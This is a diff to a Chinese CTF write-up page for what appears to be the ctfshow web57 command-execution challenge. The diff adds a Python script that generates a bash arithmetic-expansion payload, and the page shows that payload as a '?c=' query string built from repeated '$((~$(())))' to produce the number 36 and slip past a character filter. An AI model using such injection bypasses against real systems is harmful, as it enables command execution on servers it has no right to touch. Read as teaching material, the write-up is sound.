@@ -2399,7 +2399,10 @@ strings</p>
 <p>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1</p>
 </blockquote>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/CHH1%24IQ%40EBHL5L%2877%5B%40%251OP.png" alt=""><br>
-所以我们只要构造出-37，再进行取反，即可得到我们想要的数字36，payload如下</p>
+所以我们只要构造出-37，再进行取反，即可得到我们想要的数字36<br>
+写一个脚本进行构造</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
+<p>payload如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%5BYB%29%7D%5BYR3LS3%60MH~%60XVE0P4.png" alt=""><br>
 因为是cat命令，所以右键查看一下源码即可得到flag<br>
